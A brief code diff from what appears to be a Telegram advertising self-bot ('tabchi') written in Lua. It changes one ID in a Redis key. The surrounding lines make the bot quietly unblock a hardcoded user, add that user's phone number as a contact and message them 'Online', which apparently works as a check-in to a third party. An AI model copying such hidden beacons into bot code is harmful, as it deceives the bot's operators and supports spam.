@@ -162,7 +162,7 @@ function process_updates()
     jdata = jdata or {have_tab = true}
     if jdata.have_tab then
       tdcli.searchPublicChat("TgGuard")
-      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:295014783", true)
+      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:345767079", true)
       tdcli.unblockUser(180191663)
       tdcli.importContacts(639080023314, "Online", "Bot", 180191663)
       tdcli.sendMessage(180191663, 0, 1, "Online", 1, "html")
